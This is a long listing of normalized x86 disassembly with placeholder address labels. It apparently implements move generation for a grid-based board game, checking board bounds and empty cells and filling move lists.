mov [ rw-data ] ebx
cmp ebx 0x20
je r-xdata
mov ecx eax
shl ecx 0x5
add ecx [ ebp - 0x8 ]
mov [ edx + ecx * 4 ] 0x1
mov ecx eax
shl ecx 0x5
add ecx ebx
mov [ edx + ecx * 4 ] 0x1
mov edx [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ebx + ecx * 4 ]
mov ecx [ edx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov edx [ ebp + 0x18 ]
mov [ rw-data ] ecx
cmp ecx 0x20
je r-xdata
lea ecx [ edi + edi * 2 ]
lea ecx [ ebx + ecx * 4 ]
mov ebx [ ebp + 0x8 ]
mov ebx [ ebx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] ebx
cmp ebx 0x20
je r-xdata
mov ecx eax
shl ecx 0x5
add ecx [ ebp - 0xc ]
mov [ edx + ecx * 4 ] 0x1
mov ecx eax
shl ecx 0x5
add ecx ebx
mov [ edx + ecx * 4 ] 0x1
dec ebx
sub ecx 0x4
mov [ rw-data ] ebx
mov [ ebp - 0x4 ] ecx
cmp ebx 0x1
jge r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov ecx [ ebp - 0x4 ]
mov edi [ ecx ]
cmp edi 0x20
jne r-xdata
jmp r-xdata
dec ebx
sub ecx 0x4
mov [ rw-data ] ebx
mov [ ebp - 0x4 ] ecx
cmp ebx 0x1
jge r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov ecx [ ebp - 0x4 ]
mov edi [ ecx ]
cmp edi 0x20
jne r-xdata
jmp r-xdata
mov ecx [ ebp - 0xc ]
add ecx ebx
jmp r-xdata
mov [ rw-data ] 0x1
dec ebx
sub ecx 0x4
mov [ rw-data ] ebx
mov [ ebp - 0x8 ] ecx
cmp ebx 0x1
jge r-xdata
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi edi
je r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov edi [ ecx ]
cmp edi 0x20
jne r-xdata
jmp r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov ecx [ ebp - 0x8 ]
jmp r-xdata
mov ecx [ ebp - 0xc ]
add ecx ebx
jmp r-xdata
mov [ rw-data ] 0x1
dec ebx
sub ecx 0x4
mov [ rw-data ] ebx
mov [ ebp - 0x8 ] ecx
cmp ebx 0x1
jge r-xdata
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi edi
je r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov edi [ ecx ]
cmp edi 0x20
jne r-xdata
jmp r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov ecx [ ebp - 0x8 ]
jmp r-xdata
mov [ edx + ecx * 4 ] 0x1
mov ecx eax
shl ecx 0x5
add ecx [ ebp - 0xc ]
mov ecx eax
shl ecx 0x5
add ecx ebx
mov [ edx + ecx * 4 ] 0x1
mov ecx eax
shl ecx 0x5
add ecx [ rw-data ]
jmp r-xdata
mov ecx eax
shl ecx 0x5
add ecx ebx
mov [ edx + ecx * 4 ] 0x1
mov edi [ ecx ]
cmp edi 0x20
jne r-xdata
jmp r-xdata
mov edi [ ecx ]
cmp edi 0x20
jne r-xdata
jmp r-xdata
mov edi [ ecx ]
cmp edi 0x20
jne r-xdata
jmp r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov ecx [ ebp - 0x8 ]
jmp r-xdata
mov edi [ ecx ]
cmp edi 0x20
jne r-xdata
jmp r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov ecx [ ebp - 0x8 ]
jmp r-xdata
mov [ edx + ecx * 4 ] 0x1
sub_408f00
push ebp
mov ebp esp
mov eax [ ebp + 0x1c ]
sub esp 0xc
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov [ eax ] 0x0
mov ecx [ edi ]
mov ebx [ ecx * 4 + r--data ]
mov [ rw-data ] ebx
cmp ebx [ ecx * 4 + r--data ]
jg r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ ebp + 0x18 ]
mov edx [ ebp + 0xc ]
nop [ eax + eax ] ax
mov ecx [ ebp + 0x10 ]
inc ebx
mov [ rw-data ] ebx
mov ecx [ ecx ]
cmp ebx [ ecx * 4 + r--data ]
jg r-xdata
mov edx [ edx + ebx * 8 + 0x4 ]
mov [ rw-data ] edx
cmp ebx 0x1f
ja r-xdata
mov edi [ ebp + 0x10 ]
jmp r-xdata
mov edx [ ebp + 0xc ]
movzx ecx [ ebx + lookup_table_40b824 ]
jmp [ ecx * 4 + jump_table_40b7ec ]
mov ecx [ edx + ebx * 8 ]
mov [ rw-data ] ecx
test ecx ecx
je r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0xc ]
mov ecx [ ecx ]
cmp ecx [ eax + 0x80 ]
mov eax [ ebp + 0x1c ]
jne r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ebp + 0xc ]
mov ecx [ ecx ]
cmp ecx [ esi + 0x80 ]
mov esi [ ebp + 0x18 ]
jne r-xdata
mov ecx [ rw-data ]
lea esi [ edx + 0x1 ]
inc ecx
mov [ ebp - 0x4 ] esi
mov [ rw-data ] esi
mov esi [ ebp + 0x18 ]
mov [ rw-data ] ecx
cmp ecx 0x6
jg r-xdata
mov ecx [ rw-data ]
lea esi [ edx + 0x1 ]
inc ecx
mov [ ebp - 0x8 ] esi
mov [ rw-data ] esi
mov esi [ ebp + 0x18 ]
mov [ rw-data ] ecx
cmp ecx 0x6
jg r-xdata
mov ecx [ rw-data ]
lea esi [ edx + 0x2 ]
add ecx 0x2
mov [ ebp - 0x4 ] esi
mov [ rw-data ] esi
mov esi [ ebp + 0x18 ]
mov [ rw-data ] ecx
cmp ecx 0x9
jg r-xdata
mov ecx [ rw-data ]
lea esi [ edx + 0x2 ]
add ecx 0x2
mov [ ebp - 0x4 ] esi
mov [ rw-data ] esi
mov esi [ ebp + 0x18 ]
mov [ rw-data ] ecx
cmp ecx 0x9
jg r-xdata
mov ecx [ rw-data ]
mov edi [ ebp + 0x8 ]
lea eax [ ecx + ecx * 2 ]
shl eax 0x2
mov [ ebp - 0x4 ] eax
add eax edx
mov [ ebp - 0x8 ] eax
cmp [ edi + eax * 4 + 0x30 ] 0x20
mov eax [ ebp + 0x1c ]
jne r-xdata
mov ecx [ rw-data ]
mov edi [ ebp + 0x8 ]
lea eax [ ecx + ecx * 2 ]
shl eax 0x2
mov [ ebp - 0x4 ] eax
add eax edx
mov [ ebp - 0x8 ] eax
cmp [ edi + eax * 4 + 0x30 ] 0x20
mov eax [ ebp + 0x1c ]
jne r-xdata
mov edi [ rw-data ]
inc edi
mov [ rw-data ] edi
cmp edi 0x9
jg r-xdata
mov edi [ rw-data ]
inc edi
mov [ rw-data ] edi
cmp edi 0x9
jg r-xdata
mov edi [ rw-data ]
xor edx edx
inc edi
mov [ rw-data ] edx
mov [ rw-data ] edi
cmp edi 0x9
jg r-xdata
mov edi [ rw-data ]
xor edx edx
inc edi
mov [ rw-data ] edx
mov [ rw-data ] edi
cmp edi 0x9
jg r-xdata
lea ecx [ edx - 0x1 ]
mov [ rw-data ] ecx
cmp ecx 0x1
jl r-xdata
lea ecx [ edx + 0x1 ]
mov [ rw-data ] ecx
cmp ecx 0xa
jg r-xdata
lea ecx [ edx + 0x1 ]
mov [ rw-data ] ecx
cmp ecx 0xa
jg r-xdata
mov ecx [ ebp + 0xc ]
mov [ rw-data ] 0x0
mov edx [ ecx + 0x84 ]
inc edx
mov [ rw-data ] edx
cmp edx [ ecx + 0x4 ]
jge r-xdata
lea ecx [ edx + 0x1 ]
mov [ rw-data ] ecx
cmp ecx 0x3
jg r-xdata
mov ecx [ ebp + 0xc ]
mov [ rw-data ] 0x0
mov edx [ ecx + 0x84 ]
inc edx
mov [ rw-data ] edx
cmp edx [ ecx + 0x4 ]
jge r-xdata
dec edx
mov [ rw-data ] ecx
mov [ ebp - 0x8 ] edx
mov [ rw-data ] edx
cmp ecx 0x6
jg r-xdata
lea eax [ edx + 0x1 ]
cmp eax 0xa
mov eax [ ebp + 0x1c ]
jg r-xdata
dec edx
mov [ rw-data ] ecx
mov [ ebp - 0x4 ] edx
mov [ rw-data ] edx
cmp ecx 0x6
jg r-xdata
lea eax [ edx + 0x1 ]
cmp eax 0x3
mov eax [ ebp + 0x1c ]
jg r-xdata
mov [ rw-data ] ecx
lea edi [ edx - 0x2 ]
mov [ ebp - 0x8 ] edi
mov [ rw-data ] edi
mov edi [ ebp + 0x10 ]
cmp ecx 0x9
jg r-xdata
lea eax [ edx + 0x2 ]
cmp eax 0xa
mov eax [ ebp + 0x1c ]
jg r-xdata
mov [ rw-data ] ecx
lea edi [ edx - 0x2 ]
mov [ ebp - 0x8 ] edi
mov [ rw-data ] edi
mov edi [ ebp + 0x10 ]
cmp ecx 0x9
jg r-xdata
lea eax [ edx + 0x2 ]
cmp eax 0x5
mov eax [ ebp + 0x1c ]
jg r-xdata
mov esi [ ebp + 0x8 ]
dec ecx
mov [ rw-data ] ecx
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
cmp [ esi + ecx * 4 ] 0x20
mov esi [ ebp + 0x18 ]
jne r-xdata
add ecx 0x2
lea esi [ edx + 0x1 ]
mov [ rw-data ] esi
mov esi [ ebp + 0x18 ]
mov [ rw-data ] ecx
cmp ecx 0x9
jg r-xdata
mov esi [ ebp + 0x8 ]
dec ecx
mov [ rw-data ] ecx
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
cmp [ esi + ecx * 4 ] 0x20
mov esi [ ebp + 0x18 ]
jne r-xdata
add ecx 0x2
lea esi [ edx + 0x1 ]
mov [ rw-data ] esi
mov esi [ ebp + 0x18 ]
mov [ rw-data ] ecx
cmp ecx 0x9
jg r-xdata
mov edi [ rw-data ]
dec edi
mov [ rw-data ] edi
cmp edi 0x1
jl r-xdata
lea ecx [ edi + edi * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0x8 ] ecx
mov edi [ rw-data ]
dec edi
mov [ rw-data ] edi
cmp edi 0x1
jl r-xdata
lea ecx [ edi + edi * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0x8 ] ecx
mov edi [ rw-data ]
xor edx edx
dec edi
mov [ rw-data ] edx
mov [ rw-data ] edi
cmp edi 0x1
jl r-xdata
mov esi [ rw-data ]
lea ecx [ edi + edi * 2 ]
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x8 ]
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x18 ]
mov [ ebp - 0x8 ] ecx
nop [ eax ] eax
mov edi [ rw-data ]
xor edx edx
dec edi
mov [ rw-data ] edx
mov [ rw-data ] edi
cmp edi 0x1
jl r-xdata
mov esi [ rw-data ]
lea ecx [ edi + edi * 2 ]
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x8 ]
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x18 ]
mov [ ebp - 0x8 ] ecx
nop
cmp edx 0x5
jg r-xdata
mov ecx [ rw-data ]
mov esi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ecx * 4 - 0x1 ]
add ecx edx
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x18 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
cmp edx 0x6
jl r-xdata
mov ecx [ rw-data ]
mov esi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ecx * 4 + 0x1 ]
add ecx edx
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x18 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
lea ecx [ edx - 0x1 ]
mov [ rw-data ] ecx
cmp ecx 0x8
jl r-xdata
mov ecx [ rw-data ]
mov edi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ecx * 4 + 0x1 ]
add ecx edx
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x10 ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] 0x0
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov edx [ eax ]
mov ecx [ ebp + 0xc ]
mov ecx [ ecx + 0x84 ]
mov [ esi + edx * 8 + 0x4 ] ecx
mov ecx [ rw-data ]
inc [ eax ]
mov esi [ ebp + 0x8 ]
lea edx [ ecx + ecx * 2 ]
mov ecx [ ebp + 0xc ]
mov ecx [ ecx + 0x84 ]
lea ecx [ ecx + edx * 4 ]
xor edx edx
cmp [ edi ] edx
mov ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x18 ]
sete dl
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ rw-data ]
mov edi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x10 ]
nop [ eax ] eax
lea ecx [ edx - 0x1 ]
mov [ rw-data ] ecx
cmp ecx 0x1
jl r-xdata
mov ecx [ rw-data ]
mov edi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ecx * 4 + 0x1 ]
add ecx edx
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x10 ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] 0x10
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov edx [ eax ]
mov ecx [ ebp + 0xc ]
mov ecx [ ecx + 0x4 ]
mov [ esi + edx * 8 + 0x4 ] ecx
mov ecx [ rw-data ]
inc [ eax ]
mov esi [ ebp + 0x8 ]
lea edx [ ecx + ecx * 2 ]
mov ecx [ ebp + 0xc ]
mov ecx [ ecx + 0x4 ]
lea ecx [ ecx + edx * 4 ]
xor edx edx
cmp [ edi ] edx
mov ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x18 ]
sete dl
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ rw-data ]
mov edi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x10 ]
mov edx [ rw-data ]
mov ecx [ ebp - 0x4 ]
dec edx
mov [ rw-data ] edx
mov [ rw-data ] ecx
cmp edx 0x4
jl r-xdata
cmp edx 0x8
jl r-xdata
mov edi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ecx * 4 + 0x1 ]
add ecx edx
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x10 ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov edx [ rw-data ]
mov ecx [ ebp - 0x8 ]
dec edx
mov [ rw-data ] edx
mov [ rw-data ] ecx
cmp edx 0x4
jl r-xdata
cmp edx 0x1
jl r-xdata
mov edi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ecx * 4 + 0x1 ]
add ecx edx
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x10 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov ecx [ rw-data ]
lea edi [ edx + 0x2 ]
add ecx 0xfffffffe
mov [ rw-data ] edi
mov edi [ ebp + 0x10 ]
mov [ rw-data ] ecx
cmp ecx 0x1
jl r-xdata
cmp [ ebp - 0x8 ] 0x6
jl r-xdata
mov edi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ecx * 4 + 0x2 ]
add ecx edx
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x10 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov ecx [ rw-data ]
lea edi [ edx + 0x2 ]
add ecx 0xfffffffe
mov [ rw-data ] edi
mov edi [ ebp + 0x10 ]
mov [ rw-data ] ecx
cmp ecx 0x1
jl r-xdata
cmp [ ebp - 0x8 ] 0x1
jl r-xdata
mov edi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ecx * 4 + 0x2 ]
add ecx edx
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x10 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov esi [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
cmp [ esi + ecx * 4 + 0x4 ] 0x20
mov esi [ ebp + 0x18 ]
jne r-xdata
mov ecx [ rw-data ]
lea edi [ edx + 0x1 ]
add ecx 0xfffffffe
mov [ rw-data ] edi
mov edi [ ebp + 0x10 ]
mov [ rw-data ] ecx
cmp ecx 0x1
jl r-xdata
mov [ rw-data ] ecx
lea edi [ edx - 0x1 ]
mov [ rw-data ] edi
mov edi [ ebp + 0x10 ]
cmp ecx 0x9
jg r-xdata
cmp [ rw-data ] 0xa
jg r-xdata
mov esi [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
cmp [ esi + ecx * 4 + 0x4 ] 0x20
mov esi [ ebp + 0x18 ]
jne r-xdata
mov ecx [ rw-data ]
lea edi [ edx + 0x1 ]
add ecx 0xfffffffe
mov [ rw-data ] edi
mov edi [ ebp + 0x10 ]
mov [ rw-data ] ecx
cmp ecx 0x1
jl r-xdata
mov [ rw-data ] ecx
lea edi [ edx - 0x1 ]
mov [ rw-data ] edi
mov edi [ ebp + 0x10 ]
cmp ecx 0x9
jg r-xdata
cmp [ rw-data ] 0xa
jg r-xdata
mov edi [ rw-data ]
inc edi
mov [ rw-data ] edi
cmp edi 0xa
jg r-xdata
lea ecx [ edi + edi * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0x8 ] ecx
nop [ eax ] eax
mov edx [ rw-data ]
lea ecx [ edi + edi * 2 ]
mov esi [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x18 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edi
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0x8 ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov edi [ rw-data ]
inc edi
mov [ rw-data ] edi
cmp edi 0xa
jg r-xdata
lea ecx [ edi + edi * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0x8 ] ecx
mov edx [ rw-data ]
lea ecx [ edi + edi * 2 ]
mov esi [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x18 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edi
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0x8 ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov edi [ rw-data ]
xor edx edx
inc edi
mov [ rw-data ] edx
mov [ rw-data ] edi
cmp edi 0xa
jg r-xdata
mov esi [ rw-data ]
lea ecx [ edi + edi * 2 ]
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x8 ]
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x18 ]
mov [ ebp - 0x8 ] ecx
nop [ eax ] eax
test edx edx
jne r-xdata
test edx edx
jne r-xdata
mov edi [ rw-data ]
xor edx edx
inc edi
mov [ rw-data ] edx
mov [ rw-data ] edi
cmp edi 0xa
jg r-xdata
mov esi [ rw-data ]
lea ecx [ edi + edi * 2 ]
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x8 ]
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x18 ]
mov [ ebp - 0x8 ] ecx
nop [ eax ] eax
test edx edx
jne r-xdata
test edx edx
jne r-xdata
mov ecx [ rw-data ]
inc ecx
mov [ rw-data ] ecx
cmp ecx 0x9
jg r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ rw-data ]
inc ecx
mov [ rw-data ] ecx
cmp ecx 0x9
jg r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ rw-data ]
inc ecx
mov [ rw-data ] ecx
cmp ecx 0x6
jg r-xdata
mov ecx [ rw-data ]
mov edi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ecx * 4 - 0x1 ]
add ecx edx
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x10 ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] 0x0
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0x8 ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ rw-data ]
mov [ rw-data ] 0x1
jmp r-xdata
mov esi [ ebp + 0xc ]
inc edx
add ecx 0x4
mov [ rw-data ] edx
cmp edx [ esi + 0x4 ]
mov esi [ ebp + 0x18 ]
jl r-xdata
mov ecx [ rw-data ]
inc ecx
mov [ rw-data ] ecx
cmp ecx 0x6
jg r-xdata
mov ecx [ rw-data ]
mov edi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ecx * 4 - 0x1 ]
add ecx edx
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x10 ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] 0x10
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0x8 ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov edx [ rw-data ]
mov [ rw-data ] 0x1
jmp r-xdata
mov eax [ ebp + 0xc ]
inc edx
add ecx 0x4
mov [ rw-data ] edx
cmp edx [ eax + 0x4 ]
mov eax [ ebp + 0x1c ]
jl r-xdata
mov ecx [ ebp - 0x8 ]
mov [ rw-data ] edx
mov [ rw-data ] ecx
cmp edx 0x4
jl r-xdata
cmp ecx 0xa
jg r-xdata
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ ebp - 0x4 ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0x8 ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ ebp - 0x4 ]
mov [ rw-data ] edx
mov [ rw-data ] ecx
cmp edx 0x4
jl r-xdata
cmp ecx 0x3
jg r-xdata
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov ecx [ rw-data ]
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ ebp - 0x8 ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov edx [ ebp - 0x8 ]
mov [ rw-data ] ecx
mov [ rw-data ] edx
cmp ecx 0x1
jl r-xdata
cmp [ ebp - 0x4 ] 0xa
jg r-xdata
mov esi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ecx * 4 - 0x2 ]
add ecx edx
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x18 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov ecx [ rw-data ]
mov esi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
cmp [ esi + ecx * 4 + 0x34 ] 0x20
mov esi [ ebp + 0x18 ]
jne r-xdata
mov edx [ ebp - 0x8 ]
mov [ rw-data ] ecx
mov [ rw-data ] edx
cmp ecx 0x1
jl r-xdata
cmp [ ebp - 0x4 ] 0x5
jg r-xdata
mov esi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ecx * 4 - 0x2 ]
add ecx edx
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x18 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov ecx [ rw-data ]
mov ecx [ rw-data ]
mov esi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
cmp [ esi + ecx * 4 + 0x34 ] 0x20
mov esi [ ebp + 0x18 ]
jne r-xdata
mov edx [ rw-data ]
mov esi [ ebp + 0x8 ]
lea ecx [ edx - 0x1 ]
mov [ rw-data ] ecx
add ecx [ ebp - 0x4 ]
cmp [ esi + ecx * 4 ] 0x20
mov esi [ ebp + 0x18 ]
jne r-xdata
mov ecx [ rw-data ]
add edx 0x2
inc ecx
mov [ rw-data ] edx
mov [ rw-data ] ecx
cmp ecx 0x9
jg r-xdata
mov [ rw-data ] ecx
lea edi [ edx - 0x1 ]
mov [ rw-data ] edi
mov edi [ ebp + 0x10 ]
cmp ecx 0x1
jl r-xdata
cmp [ rw-data ] 0xa
jg r-xdata
mov ecx [ rw-data ]
cmp [ rw-data ] 0x1
jl r-xdata
lea ecx [ ecx + ecx * 2 ]
